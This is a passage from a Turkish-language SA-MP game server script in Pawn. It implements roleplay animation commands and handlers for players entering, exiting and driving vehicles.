  				ApplyAnimationEx(playerid,"SWAT","swt_wllpk_R_back",4.1, 0, 0, 0, 1, 1);
		    	return 1;
		    }
		}
	}
	if(strcmp(string, "/otb", true) == 0)
	{
	    string = strtok(cmdtext, idx);
	    if(!strlen(string))
	    {
	        Kullanim(playerid, "/otb [1-1]");
	        return 1;
		}
		new esya = strval(string);
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
		{
		    if(esya == 1)
		    {
		        ApplyAnimationEx(playerid,"OTB","betslp_in",4.1, 1, 1, 1, 1, 1);
		        return 1;
			}
		}
	}
	if(strcmp(string, "/shop", true) == 0)
	{
	    string = strtok(cmdtext, idx);
	    if(!strlen(string))
	    {
	        Kullanim(playerid, "/shop [1-1]");
	        return 1;
		}
		new esya = strval(string);
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
		{
		    if(esya == 1)
		    {
		        ApplyAnimationEx(playerid,"SHOP","SHP_Gun_Aim",4.1, 1, 1, 1, 1, 1);
		        return 1;
			}
		}
	}
    if(strcmp(string, "/bar", true) == 0) {
		string = strtok(cmdtext,idx);
		if(!strlen(string)){
			Kullanim(playerid, "/bar [1-6]");
			return 1;
		}
		new esya = strval(string);
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			if(esya == 1){
		     	ApplyAnimationEx(playerid,"BAR","Barserve_bottle",4.1,0,1,1,1,1);
		  		return 1;
			}
			else if(esya == 2){
			    ApplyAnimationEx(playerid,"BAR","Barserve_give",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 3){
			    ApplyAnimationEx(playerid,"BAR","Barserve_glass",4.1,0,1,1,1,1);
				return 1;
			}
			else if(esya == 4){
			    ApplyAnimationEx(playerid,"BAR","Barserve_in",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 5){
			    ApplyAnimationEx(playerid,"BAR","dnk_stndF_loop",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 6){
			    ApplyAnimationEx(playerid,"BAR","BARman_idle",4.1,0,1,1,1,1);
		   		return 1;
			}
		}
	}
    if(strcmp(string, "/dovus", true) == 0 || strcmp(string, "/fight", true) == 0) {
		string = strtok(cmdtext,idx);
		if(!strlen(string)){
			Kullanim(playerid, "/dovus [1-11]");
			return 1;
		}
		new esya = strval(string);
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			if(esya == 1){
			    ApplyAnimationEx(playerid,"PED","BIKE_elbowL",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 2){
			    ApplyAnimationEx(playerid,"PED","FightA_1",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 3){
			    ApplyAnimationEx(playerid,"PED","FightA_2",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 4){
			    ApplyAnimationEx(playerid,"PED","FightA_3",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 5){
			    ApplyAnimationEx(playerid,"PED","FightA_G",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 6){
			    ApplyAnimationEx(playerid,"PED","FightA_M",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 7){
			    ApplyAnimationEx(playerid,"PED","FIGHTIDLE",4.1,1,1,1,1,1);
		   		return 1;
			}
			else if(esya == 8){
			    ApplyAnimationEx(playerid,"PED","FightShB",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 9){
			    ApplyAnimationEx(playerid,"FIGHT_C","FightC_1",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 10){
			    ApplyAnimationEx(playerid,"FIGHT_C","FightC_2",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 11){
			    ApplyAnimationEx(playerid,"FIGHT_C","FightC_3",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 12){
			    ApplyAnimationEx(playerid,"GANGS","shake_carK",4.1,0,1,1,1,1);
		   		return 1;
			}
		}
	}
    if(strcmp(string, "/yuvarlanma", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
	    	ApplyAnimationEx(playerid,"PED","BIKE_fallR",4.1,0,1,1,1,1);
   			return 1;
		}
		return 1;
	}
    if(strcmp(string, "/dusme", true) == 0 || strcmp(string, "/fall", true) == 0) {
		string = strtok(cmdtext,idx);
		if(!strlen(string)){
			Kullanim(playerid, "/dusme [1-3]");
			return 1;
		}
		new esya = strval(string);
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			if(esya == 1){
			    ApplyAnimationEx(playerid,"PED","BIKE_fall_off",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 2){
			    ApplyAnimationEx(playerid,"PED","FLOOR_hit",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 3){
			    ApplyAnimationEx(playerid,"PED","FLOOR_hit_f",4.1,0,1,1,1,1);
		   		return 1;
			}
		}
	}
    if(strcmp(string, "/clean", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
	     	ApplyAnimationEx(playerid,"PED","CLIMB_idle",4.1,0,1,1,1,1);
	   		return 1;
		}
		return 1;
	}
    if(strcmp(string, "/korun", true) == 0 || strcmp(string, "/cover", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
	     	ApplyAnimationEx(playerid,"PED","cower",4.1,0,1,1,1,1);

	   		return 1;
		}
		return 1;
	}
    if(strcmp(string, "/reddet", true) == 0 || strcmp(string, "/no", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
	     	ApplyAnimationEx(playerid,"PED","endchat_02",4.1,0,1,1,1,1);

	   		return 1;
		}
		return 1;
	}
    if(strcmp(string, "/elsalla", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			ApplyAnimationEx(playerid,"PED","endchat_03",4.1,0,1,1,1,1);

	   		return 1;
		}
		return 1;
	}
    if(strcmp(string, "/elhareketi", true) == 0 || strcmp(string, "/fuckyou", true) == 0 ||  strcmp(string, "/fucku", true) == 0 || strcmp(string, "/fu", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			ApplyAnimationEx(playerid,"PED","fucku",4.1,0,1,1,1,1);
	   		return 1;
		}
		return 1;
	}
    if(strcmp(string, "/uzul", true) == 0 || strcmp(string, "/cry", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			ApplyAnimationEx(playerid,"PED","gas_cwr",4.1,0,0,0,1,1);
	   		return 1;
		}
		return 1;
	}
    if(strcmp(string, "/ellerhavaya", true) == 0 || strcmp(string, "/handsup", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			ApplyAnimationEx(playerid,"PED","handsup",4.1,0,1,1,1,1);
	   		return 1;
		}
		return 1;
	}
	if(strcmp(string, "/yorgun", true) == 0 || strcmp(string, "/tired", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			ApplyAnimationEx(playerid,"PED","IDLE_tired",4.1,1,1,1,1,1);
	   		return 1;
		}
		return 1;
	}
	if(strcmp(string, "/eluzat", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
	 		ApplyAnimationEx(playerid,"PED","Jetpack_Idle",4.1,0,1,1,1,1);
	   		return 1;
		}
		return 1;
	}
	if(strcmp(string, "/robman", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			ApplyAnimationEx(playerid, "SHOP", "ROB_Loop_Threat", 4.0, 1, 0, 0, 0, 0);
	   		return 1;
		}
		return 1;
	}

	if(strcmp(string, "/vurulma", true) == 0)
	{
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
		{
			string = strtok(cmdtext, idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/vurulma [1-4]");
				return 1;
			}
			new animationplayed = strval(string);
			if(animationplayed < 1 || animationplayed > 4)
			{
				Kullanim(playerid, "/vurulma [1-4]");
				return 1;
			}
			if(animationplayed == 1)
			{
	            ApplyAnimationEx(playerid,"PED","KO_shot_stom",4.1,0,1,1,1,1);
			}
			else if(animationplayed == 2)
			{
                ApplyAnimationEx(playerid,"PED","KO_shot_face",4.1,0,1,1,1,1);
			}
			else if(animationplayed == 3)
			{
                ApplyAnimationEx(playerid,"PED","KO_spin_R",4.1,0,1,1,1,1);
			}
			else if(animationplayed == 4)
			{
                ApplyAnimationEx(playerid,"BASEBALL","Bat_Hit_3",4.1,0,1,1,1,1);
			}
		}
		return 1;
	}
	if(strcmp(string, "/crossarms", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			ApplyAnimationEx(playerid,"COP_AMBIENT", "Coplook_loop",4.1,0,1,1,1,1);
	   		return 1;
		}
		return 1;
	}
	if(strcmp(string, "/anlasma", true) == 0)
	{
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
		{
			string = strtok(cmdtext, idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/anlasma [1-2]");
				return 1;
			}
			new animationplayed = strval(string);
			if(animationplayed < 1 || animationplayed > 2)
			{
				Kullanim(playerid, "/anlasma [1-2]");
				return 1;
			}
			if(animationplayed == 1)
			{
	            ApplyAnimationEx(playerid,"DEALER","DEALER_DEAL",4.1,0,1,1,1,1);
			}
			else if(animationplayed == 2)
			{
	            ApplyAnimationEx(playerid,"DEALER","shop_pay",4.1,0,1,1,1,1);
			}
		}
		return 1;
	}
	if(strcmp(string, "/kvur", true) == 0)
	{
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
		{
			string = strtok(cmdtext, idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/kvur [1]");
				return 1;
			}
			new animationplayed = strval(string);
			if(animationplayed < 1 || animationplayed > 1)
			{
				Kullanim(playerid, "/kvur [1]");
				return 1;
			}
			if(animationplayed == 1)
			{
			    ApplyAnimationEx(playerid,"GANGS","shake_carSH",4.1,0,1,1,1,1);
			}
		}
		return 1;
	}
	if(strcmp(string, "/taichi", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			ApplyAnimationEx(playerid,"PARK","Tai_Chi_Loop",4.0,1,0,0,0,0);
	   		return 1;
		}
		return 1;
	}
	if(strcmp(string, "/yerindesay", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			ApplyAnimationEx(playerid,"PED","Turn_L",4.1,1,1,1,1,1);
	   		return 1;
		}
		return 1;
	}
	if(strcmp(string, "/kor", true) == 0 || strcmp(string, "/blind", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			ApplyAnimationEx(playerid,"PED","Walk_Wuzi",4.1,1,1,1,1,1);
	   		return 1;
		}
		return 1;
	}
	if(strcmp(string, "/dans", true) == 0 || strcmp(string, "/dance", true) == 0)
	{
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
		{
			string = strtok(cmdtext, idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/dans [1-9]");
				return 1;
			}
			new animationplayed = strval(string);
			if(animationplayed < 1 || animationplayed > 9)
			{
				Kullanim(playerid, "/dans [1-9]");
				return 1;
			}
			if(animationplayed == 1)
			{
				SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE1);
			}
			else if(animationplayed == 2) {
				SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE2);
			}
			else if(animationplayed == 3) {
				SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE3);
			}
			else if(animationplayed == 4) {
				SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE4);
			}
			else if(animationplayed == 5) {
				ApplyAnimationEx(playerid,"DANCING","DAN_Down_A",4.1,1,1,1,1,1);
			}
			else if(animationplayed == 6) {
				ApplyAnimationEx(playerid,"DANCING","DAN_Left_A",4.1,1,1,1,1,1);
			}
			else if(animationplayed == 7) {
				ApplyAnimationEx(playerid,"DANCING","DAN_Right_A",4.1,1,1,1,1,1);
			}
			else if(animationplayed == 8) {
				ApplyAnimationEx(playerid,"DANCING","dnce_M_a",4.1,1,1,1,1,1);
			}
			else if(animationplayed == 9)
			{
				ApplyAnimationEx(playerid,"DANCING","dnce_M_e",4.1,1,1,1,1,1);
			}
		}
		return 1;
	}
	if(strcmp(string, "/elyika", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			ApplyAnimationEx(playerid,"BD_FIRE","wash_up",4.1,0,1,1,1,1);
	   		return 1;
		}
		return 1;
	}
	if(strcmp(string, "/ucantekme", true) == 0 || strcmp(string, "/flykick", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			ApplyAnimationEx(playerid,"BIKED","BIKEd_kick",4.1,0,1,1,0,0);

			UnfreezeTimerVar[playerid] = SetTimerEx("UnfreezeTimer", 500, false, "i", playerid);
	   		return 1;
		}
		return 1;
	}
	if(strcmp(string, "/kus", true) == 0 || strcmp(string, "/vomit", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			ApplyAnimationEx(playerid,"FOOD","EAT_Vomit_P",4.1,0,1,1,1,1);
	   		return 1;
		}
		return 1;
	}
	if(strcmp(string, "/egil", true) == 0 || strcmp(string, "/bomb", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			ApplyAnimationEx(playerid,"BOMBER","BOM_Plant_Crouch_In",4.1,0,1,1,1,1);
	   		return 1;
		}
		return 1;
	}
	if(strcmp(string, "/cagir", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			ApplyAnimationEx(playerid,"GANGS","DEALER_DEAL",4.1,0,1,1,1,1);
	   		return 1;
		}
		return 1;
	}
	if(strcmp(string, "/ic", true) == 0 || strcmp(string, "/drink", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			ApplyAnimationEx(playerid,"GANGS","drnkbr_prtl",4.1,0,1,1,1,1);
	   		return 1;
		}
		return 1;
	}
	if(strcmp(string, "/yaslan", true) == 0 || strcmp(string, "/lean", true) == 0)
	{
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
		{
			string = strtok(cmdtext, idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/lean [1-3]");
				return 1;
			}
			new animationplayed = strval(string);
			if(animationplayed < 1 || animationplayed > 3)
			{
				Kullanim(playerid, "/lean [1-3]");
				return 1;
			}
			if(animationplayed == 1)
			{
			    ApplyAnimationEx(playerid,"GANGS","leanIDLE",4.1,0,1,1,1,1);
			}
			else if(animationplayed == 2)
			{
			    ApplyAnimationEx(playerid,"LOWRIDER","M_smklean_loop",4.1,0,1,1,1,1);
			}
			else if(animationplayed == 3)
			{
			    ApplyAnimationEx(playerid,"MISC", "Plyrlean_loop", 4.0, 0, 1, 1, 1, -1);
			}
		}
		return 1;
	}
	else if(strcmp(string, "/yaslan", true) == 0 || strcmp(string, "/lean", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			ApplyAnimationEx(playerid,"GANGS","leanIDLE",4.1,0,1,1,1,1);
	   		return 1;
		}
		return 1;
	}
    if(strcmp(string, "/kalk", true) == 0) {
		string = strtok(cmdtext,idx);
		if(!strlen(string)){
			Kullanim(playerid, "/kalk [1-3]");
			return 1;
		}
		new esya = strval(string);
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			if(esya == 1){
			    ApplyAnimationEx(playerid,"PED","getup",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 2){
			    ApplyAnimationEx(playerid,"PED","getup_front",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 3){
			    ApplyAnimationEx(playerid,"PED","SEAT_up",4.1,0,1,1,0,0);
		   		return 1;
			}
		}
	}
    if(strcmp(string, "/bat", true) == 0) {
		string = strtok(cmdtext,idx);
		if(!strlen(string)){
		Kullanim(playerid, "/bat [1-2]");
		return 1;
		}
		new esya = strval(string);
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			if(esya == 1){
			    ApplyAnimationEx(playerid, "CRACK", "Bbalbat_Idle_01", 4.0, 1, 0, 0, 0, 0);
		   		return 1;
			}
			else if(esya == 2){
			    ApplyAnimationEx(playerid, "CRACK", "Bbalbat_Idle_02", 4.0, 1, 0, 0, 0, 0);
		   		return 1;
			}
		}
		return 1;
	}
 	if(strcmp(string, "/uzan", true) == 0 || strcmp(string, "/lay", true) == 0) {
		string = strtok(cmdtext,idx);
		if(!strlen(string)){
			Kullanim(playerid, "/uzan [1-5]");
			return 1;
		}
		new esya = strval(string);
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			if(esya == 1){
			    ApplyAnimationEx(playerid,"BEACH","bather",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 2){
			    ApplyAnimationEx(playerid,"BEACH","ParkSit_W_loop",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 3){
		        ApplyAnimationEx(playerid,"BEACH","ParkSit_M_loop",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 4){
		        ApplyAnimationEx(playerid,"BEACH","SitnWait_loop_W",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 5){
		        ApplyAnimationEx(playerid,"BEACH", "LAY_BAC_LOOP",4.1,0,1,1,1,1);
		   		return 1;
			}
		}
	}
	if(strcmp(string, "/elkaldir", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {

			ApplyAnimationEx(playerid,"ON_LOOKERS","Pointup_in",4.1,0,1,1,1,1);

	   		return 1;
		}
		return 1;
	}
	if(strcmp(string, "/panik", true) == 0 || strcmp(string, "/panic", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {

		    ApplyAnimationEx(playerid,"ON_LOOKERS","panic_point",4.1,0,1,1,1,1);
	   		return 1;
		}
		return 1;
	}
	if(strcmp(string, "/bagir", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			ApplyAnimationEx(playerid,"ON_LOOKERS","shout_loop",4.1,0,1,1,1,1);

	   		return 1;
		}
		return 1;
	}
	if(strcmp(string, "/op", true) == 0 || strcmp(string, "/kiss", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			ApplyAnimationEx(playerid,"KISSING","Playa_Kiss_03",4.1,0,1,1,1,1);
	   		return 1;
		}
		return 1;
	}
	if(strcmp(string, "/kalpmasaji", true) == 0 || strcmp(string, "/medic", true) == 0) {
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			ApplyAnimationEx(playerid,"MEDIC","CPR",4.1,0,1,1,1,1);
	   		return 1;
		}
		return 1;
	}
    if(strcmp(string, "/selam", true) == 0)
	{
		string = strtok(cmdtext,idx);
		if(!strlen(string))
		{
			Kullanim(playerid, "/selam [1-5]");
			return 1;
		}
		new selamanim = strval(string);
		string = strtok(cmdtext, idx);
		if(!strlen(string))
		{
			if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
			{
			    switch(selamanim)
			    {
			        case 1:
					{
					    ApplyAnimationEx(playerid,"GANGS","hndshkba",4.1,0,1,1,1,1);
				   		return 1;
					}
					case 2:
					{
					    ApplyAnimationEx(playerid,"GANGS","hndshkcb",4.1,0,1,1,1,1);
				   		return 1;
					}
					case 3:
					{
				        ApplyAnimationEx(playerid,"GANGS","hndshkda",4.1,0,1,1,1,1);
				   		return 1;
					}
					case 4:
					{
				        ApplyAnimationEx(playerid,"GANGS","hndshkea",4.1,0,1,1,1,1);
				   		return 1;
					}
					case 5:
					{
				        ApplyAnimationEx(playerid,"GANGS","hndshkfa_swt",4.1,0,1,1,1,1);
				   		return 1;
					}
				}
			}
			else
			{
			    Hata(playerid,"Araçtayken animasyon kullanamazsýnýz.");
			    return 1;
			}
		}
		return 1;
	}
    if(strcmp(string, "/crack", true) == 0) {
		string = strtok(cmdtext,idx);
		if(!strlen(string)){
			Kullanim(playerid, "/crack [1-7]");
			return 1;
		}
		new esya = strval(string);
	 	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			if(esya == 1){
			    ApplyAnimationEx(playerid,"CRACK","crckdeth1",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 2){
		     	ApplyAnimationEx(playerid,"CRACK","crckdeth2",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 3){
		     	ApplyAnimationEx(playerid,"CRACK","crckdeth3",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 4){
		     	ApplyAnimationEx(playerid,"CRACK","crckdeth4",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 5){
		     	ApplyAnimationEx(playerid,"CRACK","crckidle1",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 6){
		     	ApplyAnimationEx(playerid,"CRACK","crckidle2",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 7){
		     	ApplyAnimationEx(playerid,"CRACK","crckidle3",4.1,0,1,1,1,1);
		   		return 1;
			}
		}
	}
    if(strcmp(string, "/zipla", true) == 0 || strcmp(string, "/jump", true) == 0) {
        if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
	    	ApplyAnimationEx(playerid,"PED","EV_dive",4.1,0,1,1,1,1);
	    	return 1;
		}
		return 1;
	}
    if(strcmp(string, "/durus", true) == 0) {
		string = strtok(cmdtext,idx);
		if(!strlen(string)){
			Kullanim(playerid, "/durus [1-3]");
			return 1;
		}
		new esya = strval(string);
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			if(esya == 1){
			    ApplyAnimationEx(playerid,"PED","car_hookertalk",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 2){
			    ApplyAnimationEx(playerid,"PED","roadcross",4.1,0,1,1,1,1);
		   		return 1;
			}
			else if(esya == 3){
			    ApplyAnimationEx(playerid,"PED","roadcross_female",4.1,0,1,1,1,1);
		   		return 1;
			}
		}
		return 1;
	}
	return Hata(playerid, "Sunucuda böyle bir komut bulunmamaktadýr!");
}

public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
	if(Debug) printf("OnPlayerEnterVehicle(%d, %d, %d)",playerid, vehicleid, ispassenger);
    SetPVarInt(playerid,"ac_car_id",vehicleid);
    for(new i; i<MAX_PLAYERS; i++)
    {
       	if (ispassenger) return 1;
       	if(IsPlayerInVehicle(i,vehicleid) && GetPlayerState(i) == PLAYER_STATE_DRIVER && Karakter[playerid][adminlevel] < 1)
	   	{
       		new Float:pPos[3];
       		GetPlayerPos(playerid,pPos[0],pPos[1],pPos[2]);
       		SetPlayerPos(playerid,pPos[0],pPos[1],pPos[2]+1);
       		return 1;
		}
  	}
    if(!ispassenger)
    {
        if(Arac[vehicleid][abirliktip] == LSPD && Birlik[Karakter[playerid][birlik]][ftip] != LSPD && Karakter[playerid][adminlevel] < 1)
		{
			TogglePlayerControllable(playerid, false);
	    	TogglePlayerControllable(playerid, true);
		}
    }
    if(KutuTasiyor[playerid] != 0)
	{
 		TogglePlayerControllable(playerid, false);
	    TogglePlayerControllable(playerid, true);
	}
	if(IsABike(vehicleid) && Arac[vehicleid][aowner] != Karakter[playerid][sqlid])
	{
 		TogglePlayerControllable(playerid, false);
	    TogglePlayerControllable(playerid, true);
	}
	if(Arac[vehicleid][atip] == 3 && Karakter[playerid][meslek] != 1)
	{
	    TogglePlayerControllable(playerid, false);
	    TogglePlayerControllable(playerid, true);
	}
	if(Arac[vehicleid][atip] == 2 && Arac[vehicleid][arutbe] != 0 && Karakter[playerid][birlik] == Arac[vehicleid][abirlik])
	{
		if(Karakter[playerid][rutbe] > Arac[vehicleid][arutbe])
		{
		    TogglePlayerControllable(playerid, false);
		    TogglePlayerControllable(playerid, true);
		}
	}
	if(Arac[vehicleid][vergi] > floatround(Arac[vehicleid][afiyat]/20))
	{
	    if(Karakter[playerid][adminlevel] < 1 && Arac[vehicleid][abirliktip] != ASMS && Arac[vehicleid][abirliktip] != LSPD)
	    {
	    	TogglePlayerControllable(playerid, false);
			TogglePlayerControllable(playerid, true);
		}
		Hata(playerid, "Araç vergi kilidinde.");
	}
	return 1;
}

public OnPlayerExitVehicle(playerid, vehicleid)
{
	if(Debug) printf("OnPlayerExitVehicle(%d, %d)",playerid, vehicleid);
    if (ehliyettesti[playerid] == 1)
	{
	    SetTimerEx("PutInsideVehicle", 500, false, "dd", playerid, vehicleid);
		ShowPlayerDialog(playerid, 503, DIALOG_STYLE_MSGBOX, "Testten Ayrýlma Onayý", "Uyarý: Sürüþ testinden ayrýlmak istediðinize emin misiniz?", "Evet", "Hayýr");
	}
	return 1;
}

public OnPlayerStateChange(playerid, newstate, oldstate)
{
    if(IsPlayerNPC(playerid)) return 1;
    if(Debug) printf("OnPlayerStateChange(%d, %d, %d)",playerid, newstate, oldstate);
    if(newstate==PLAYER_STATE_PASSENGER)
	{
	    if(Birlik[Karakter[playerid][birlik]][ftip] != LSPD)
		{
		    if(GetPlayerWeapon(playerid) == 24) {
				SilahKullaniyor[playerid] = 0;
				RemovePlayerWeapon(playerid, GetPlayerWeapon(playerid));
		    } else if(GetPlayerWeapon(playerid) == 25) {
				SilahKullaniyor[playerid] = 0;
				RemovePlayerWeapon(playerid, GetPlayerWeapon(playerid));
		    }
	    }
	}
 	if(newstate==PLAYER_STATE_DRIVER)
	{
	    if(GetPlayerWeapon(playerid) == 28 || GetPlayerWeapon(playerid) == 29 || GetPlayerWeapon(playerid) == 32)
	    {
	        SilahKullaniyor[playerid] = 0;
			RemovePlayerWeapon(playerid, GetPlayerWeapon(playerid));
	    }
	    if(Arac[GetPlayerVehicleID(playerid)][vergi] > floatround(Arac[GetPlayerVehicleID(playerid)][afiyat]/20))
		{
		    if(Karakter[playerid][adminlevel] < 1 && Arac[GetPlayerVehicleID(playerid)][abirliktip] != ASMS && Arac[GetPlayerVehicleID(playerid)][abirliktip] != LSPD)
		    {
		    	RemovePlayerFromVehicle(playerid);
			}
		}
	}
	if(oldstate == PLAYER_STATE_DRIVER) KillTimer(TimerPlayerInCar[playerid]);
	if(newstate == 1)
	{
	    if(sarkidinliyo[playerid] == 1)
		{
		    StopAudioStreamForPlayer(playerid);
		}
	}
	if(newstate == PLAYER_STATE_PASSENGER)
	{
	    new vid = GetPlayerVehicleID(playerid);
	    SonArac[playerid] = vid;
		if(Arac[vid][amodel] == 438 || Arac[vid][amodel] == 420)
		{
			TaksimetreGoster(playerid);
		}
		if(Arac[vid][akilit])
		{
		    Hata(playerid, "Bu araç kilitli.");
		    RemovePlayerFromVehicle(playerid);
		    return 1;
		}
	}
	if(oldstate == PLAYER_STATE_DRIVER)
	{
	    new oldcar = SonArac[playerid];
   		if(otobuste[playerid] == 1)
		{
			SetPlayerPos(playerid, Veriler[otobusX], Veriler[otobusY], Veriler[otobusZ]);
		    SetVehicleToRespawn(oldcar);
		    Bilgi(playerid, "Otobüs seferini iptal ettiniz.");
	     	DisablePlayerCheckpoint(playerid);
			Karakter[playerid][pCheckpoint] = 0;
			otobuste[playerid] = 0;
			MotoruKapat(oldcar);
			Aractamiri(oldcar);
		}
	    if(Arac[oldcar][atip] == 3)
	    {
	        MotoruKapat(oldcar);
	        SetVehicleToRespawn(oldcar);
	        Aractamiri(oldcar);
	        DisablePlayerCheckpoint(playerid);
	        SevkiyatCheckpoint[playerid] = 0;
	        SevkiyatGorev[playerid] = 0;
	        if(SevkiyatGorev[playerid]) Hata(playerid, "Araçtan indiðiniz için görev iptal edildi.");
	        SetPlayerPos(playerid, Veriler[sevkX], Veriler[sevkY], Veriler[sevkZ]);
	    }
	    if(Arac[oldcar][atip] == 6)
	    {
			PizzaTimer[playerid] = SetTimerEx("PizzaIptal", 10000, false, "id", playerid, oldcar);
			Ipucu(playerid, "Motorunuza 10 saniye içinde binmezseniz otomatik olarak iþbaþýndan çýkarýlýcaksýnýz.");
			SetPVarInt(playerid, "PizzaMotor", oldcar);
		}
		if(Arac[oldcar][atip] == 7)
		{
		    MotoruKapat(oldcar);
		    SetVehicleToRespawn(oldcar);
		    Aractamiri(oldcar);
		    DisablePlayerCheckpoint(playerid);
		    SicilTCheckpoint[playerid] = 0;
		    SicilTGorevde[playerid] = 0;
			Karakter[playerid][misbasi] = 0;
			SetPlayerColor(playerid, COLOR_WHITE);
			Bilgi(playerid, "Araçtan indiðiniz için otomatik olarak iþbaþýndan çýktýnýz.");
		}
		if(Arac[oldcar][atip] == 11)
		{
		    MotoruKapat(oldcar);
		    SetVehicleToRespawn(oldcar);
		    Aractamiri(oldcar);
		    DisablePlayerCheckpoint(playerid);
		    KamCheckpoint[playerid] = 0;
		    KamGorevde[playerid] = 0;
			Karakter[playerid][misbasi] = 0;
			SetPlayerColor(playerid, COLOR_WHITE);
			Bilgi(playerid, "Araçtan indiðiniz için otomatik olarak iþbaþýndan çýktýnýz.");
			SetPlayerSkin(playerid, Karakter[playerid][skin]);
			SetPlayerPos(playerid, 2219.3762,-2666.3638,13.5399);
		}
		if(Arac[oldcar][atip] == 12)
		{
		    MotoruKapat(oldcar);
		    SetVehicleToRespawn(oldcar);
		    Aractamiri(oldcar);
		    DisablePlayerCheckpoint(playerid);
		    EleCheckpoint[playerid] = 0;
		    EleGorevde[playerid] = 0;
			Karakter[playerid][misbasi] = 0;
			SetPlayerColor(playerid, COLOR_WHITE);
			Bilgi(playerid, "Araçtan indiðiniz için otomatik olarak iþbaþýndan çýktýnýz.");
			SetPlayerSkin(playerid, Karakter[playerid][skin]);
